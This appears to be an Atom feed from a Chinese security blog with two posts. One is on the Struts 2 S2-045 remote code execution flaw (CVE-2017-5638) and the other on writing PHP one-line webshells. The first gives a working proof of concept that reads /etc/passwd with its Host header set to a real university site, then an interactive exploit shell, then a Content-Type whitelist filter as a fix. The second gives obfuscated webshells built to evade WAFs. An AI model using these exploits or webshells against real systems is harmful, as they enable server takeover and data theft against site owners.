<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iosmosis&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iosmosis.github.io/"/>
  <updated>2017-03-08T06:17:11.653Z</updated>
  <id>http://iosmosis.github.io/</id>
  
  <author>
    <name>iosmosis</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</title>
    <link href="http://iosmosis.github.io/2017/03/07/str2-045/"/>
    <id>http://iosmosis.github.io/2017/03/07/str2-045/</id>
    <published>2017-03-07T07:02:56.000Z</published>
    <updated>2017-03-08T06:17:11.653Z</updated>
    
    <content type="html"><![CDATA[<h3 id="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"><a href="#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。" class="headerlink" title="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"></a>近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</h3><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><h3 id="S2-045，CVE-2017-5638"><a href="#S2-045，CVE-2017-5638" class="headerlink" title="S2-045，CVE-2017-5638"></a>S2-045，CVE-2017-5638</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><h3 id="基于-Jakarta-plugin插件的Struts远程代码执行漏洞"><a href="#基于-Jakarta-plugin插件的Struts远程代码执行漏洞" class="headerlink" title="基于 Jakarta plugin插件的Struts远程代码执行漏洞"></a>基于 Jakarta plugin插件的Struts远程代码执行漏洞</h3><h2 id="官方评级"><a href="#官方评级" class="headerlink" title="官方评级"></a>官方评级</h2><h3 id="高危"><a href="#高危" class="headerlink" title="高危"></a>高危</h3><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"><a href="#Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令" class="headerlink" title="Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"></a>Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</h3><h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式"></a>漏洞利用条件和方式</h2><h3 id="黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。"><a href="#黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。" class="headerlink" title="黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。"></a>黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</h3><p>1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能<br>2.恶意攻击者精心构造Content-Type的值</p>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><h3 id="Struts-2-3-5-–-Struts-2-3-31"><a href="#Struts-2-3-5-–-Struts-2-3-31" class="headerlink" title="Struts 2.3.5 – Struts 2.3.31"></a>Struts 2.3.5 – Struts 2.3.31</h3><pre><code>Struts 2.5 – Struts 2.5.10
Created by Lukasz Lenart, last modified yesterday at 01:14 PM
</code></pre><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</div><div class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</div><div class="line"></div><div class="line">header1 =&#123;</div><div class="line"><span class="string">"Host"</span>:<span class="string">"alumnus.shu.edu.cn"</span>,</div><div class="line"><span class="string">"Connection"</span>:<span class="string">"keep-alive"</span>,</div><div class="line"><span class="string">"Refer"</span>:<span class="string">"alumnus.shu.edu.cn"</span>,</div><div class="line"><span class="string">"Accept"</span>:<span class="string">"*/*"</span>,</div><div class="line"><span class="string">"X-Requested-With"</span>:<span class="string">"XMLHttpRequest"</span>,</div><div class="line"><span class="string">"Accept-Encoding"</span>:<span class="string">"deflate"</span>,</div><div class="line"><span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></div><div class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">'''%&#123;(#nike='multipart/form-data').</span></div><div class="line">    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</div><div class="line">    (#_memberAccess?(#_memberAccess=#dm):</div><div class="line">    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).</div><div class="line">    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</div><div class="line">    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</div><div class="line">    (#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').</div><div class="line">    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</div><div class="line">    (#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</div><div class="line">    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).</div><div class="line">    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().</div><div class="line">    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).</div><div class="line">    (#ros.flush())&#125;'''</div><div class="line">    request = urllib2.Request(str(sys.argv[<span class="number">1</span>]),datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    <span class="keyword">print</span> response.read()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">poc()</div></pre></td></tr></table></figure>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests,json,re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poc</span><span class="params">(url,command)</span>:</span></div><div class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16'</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>&#125;</div><div class="line">    headers[<span class="string">"Content-Type"</span>] = <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \</span></div><div class="line">                          "+command+<span class="string">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line"></div><div class="line">    data = json.dumps(&#123;<span class="string">"image1"</span>:url&#125;)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        req = requests.post(url,data=data,headers=headers)</div><div class="line">        <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</div><div class="line">            <span class="keyword">print</span> req.content</div><div class="line">    <span class="keyword">except</span> requests.ConnectionError,e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line"></div><div class="line">th = &#123;<span class="string">"url"</span>:<span class="string">""</span>&#125;</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> th.get(<span class="string">"url"</span>) != <span class="string">""</span>:</div><div class="line">        input_cmd = raw_input(<span class="string">"cmd &gt;&gt;: "</span>)</div><div class="line">        <span class="keyword">if</span> input_cmd == <span class="string">"exit"</span>:</div><div class="line">            exit()</div><div class="line">        <span class="keyword">elif</span> input_cmd == <span class="string">'set'</span>:</div><div class="line">            url = raw_input(<span class="string">"set url :"</span>)</div><div class="line">            th[<span class="string">'url'</span>] = url</div><div class="line">        <span class="keyword">elif</span> input_cmd == <span class="string">'show url'</span>:</div><div class="line">            <span class="keyword">print</span> th.get(<span class="string">"url"</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            Poc(th.get(<span class="string">"url"</span>),input_cmd)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        url = raw_input(<span class="string">"set url :"</span>)</div><div class="line">        th[<span class="string">"url"</span>] = url</div></pre></td></tr></table></figure>
<h2 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h2><h3 id="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"><a href="#通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。" class="headerlink" title="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"></a>通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> javax.servlet.Filter;</div><div class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</div><div class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletException;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecurityFilter</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * </div><div class="line">	 */</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</div><div class="line">	</div><div class="line">	</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String www_url_encode= <span class="string">"application/x-www-form-urlencoded"</span>;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String mul_data= <span class="string">"multipart/form-data "</span>;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String txt_pla= <span class="string">"text/plain"</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1,</span></span></div><div class="line">			FilterChain arg2) <span class="keyword">throws</span> IOException, ServletException &#123;</div><div class="line"></div><div class="line">		HttpServletRequest request = (HttpServletRequest) arg0;</div><div class="line">		HttpServletResponse response = (HttpServletResponse) arg1;</div><div class="line">		</div><div class="line">		String contenType=request.getHeader(<span class="string">"conTent-type"</span>);</div><div class="line">		</div><div class="line">		<span class="keyword">if</span>(contenType!=<span class="keyword">null</span>&amp;&amp;!contenType.equals(<span class="string">""</span>)&amp;&amp;!contenType.equalsIgnoreCase(www_url_encode)&amp;&amp;!contenType.equalsIgnoreCase(mul_data)&amp;&amp;!contenType.equalsIgnoreCase(txt_pla))&#123;</div><div class="line">			</div><div class="line">			response.setContentType(<span class="string">"text/html;charset=UTF-8"</span>);</div><div class="line">			response.getWriter().write(<span class="string">"非法请求Content-Type！"</span>);</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		arg2.doFilter(request, response);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下"><a href="#将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下" class="headerlink" title="将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下"></a>将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下</h3><h3 id="⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中"><a href="#⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中" class="headerlink" title="⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中"></a>⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;filter&gt;</div><div class="line">    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;</div><div class="line">    &lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt;</div><div class="line">  &lt;/filter&gt;</div><div class="line">&lt;filter-mapping&gt;</div><div class="line">    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;</div><div class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</div><div class="line">&lt;/filter-mapping&gt;</div></pre></td></tr></table></figure>
<h3 id="代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。"><a href="#代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。" class="headerlink" title="/代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。"></a>/<em>代表拦截所有请求，进行攻击代码检查，</em>.action只检查.action结尾的请求。</h3><h3 id="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器"><a href="#如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器" class="headerlink" title="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器"></a>如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 <a href="https://repository.apache.org/content/groups/staging/org/apache/struts/struts2-core/2.3.32/" target="_blank" rel="external">Apache Struts 2.3.32</a>或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器</h3><h3 id="重启应用即可"><a href="#重启应用即可" class="headerlink" title="重启应用即可"></a>重启应用即可</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;a href=&quot;#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot; class=&quot;headerlink&quot; title=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;/a&gt;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&lt;/h3&gt;&lt;h2 id=&quot;漏洞编号&quot;&gt;&lt;a href=&quot;#漏洞编号&quot; class=&quot;headerlink&quot; title=&quot;漏洞编号&quot;&gt;&lt;/a&gt;漏洞编号&lt;/h2&gt;&lt;h3 id=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;a href=&quot;#S2-045，CVE-2017-5638&quot; class=&quot;headerlink&quot; title=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;/a&gt;S2-045，CVE-2017-5638&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
    
    </summary>
    
    
      <category term="S2-045" scheme="http://iosmosis.github.io/tags/S2-045/"/>
    
      <category term="poc" scheme="http://iosmosis.github.io/tags/poc/"/>
    
      <category term="exp" scheme="http://iosmosis.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>一句话Shell编写思路</title>
    <link href="http://iosmosis.github.io/2017/03/05/oneshell/"/>
    <id>http://iosmosis.github.io/2017/03/05/oneshell/</id>
    <published>2017-03-05T04:47:01.000Z</published>
    <updated>2017-03-08T06:14:54.885Z</updated>
    
    <content type="html"><![CDATA[<h3 id="很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路"><a href="#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路" class="headerlink" title="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路"></a>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $jg16=base64_decode;</div><div class="line">$z=$jg16(YXNzZXJ0);</div><div class="line">$z($_POST[q]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">这个一句话需要用到这个函数</div><div class="line"><span class="comment">//base64_encode();//base64编码</span></div><div class="line"><span class="comment">//base64_decode();//base64解码</span></div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
<p>##system()的巧妙利用</p>
<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system($_GET[‘a’]($_GET[‘b’]))</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kaisa</span><span class="params">($arr)</span></span>&#123;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-6</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr=<span class="string">"j&#123;fq-)dUTXY`&#125;b.@"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-5</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>($arr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">payload解析：</div><div class="line"> </div><div class="line">;来结束语句</div><div class="line"> </div><div class="line">&#125;来结束函数体</div><div class="line"> </div><div class="line">phpinfo();;就在函数体外面被<span class="keyword">eval</span>执行了</div><div class="line"> </div><div class="line"><span class="comment">/*注释多余的代码</span></div><div class="line"> </div><div class="line">最终代码：eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;)</div><div class="line">最终构造出</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">$args = "１";</div><div class="line">$code = "n;&#125;$_POST[x];/*";</div><div class="line">echo create_function('$args',$code);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot;&gt;&lt;a href=&quot;#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot; class=&quot;headerlink&quot; title=&quot;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&quot;&gt;&lt;/a&gt;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&lt;/h3&gt;&lt;ul&gt;
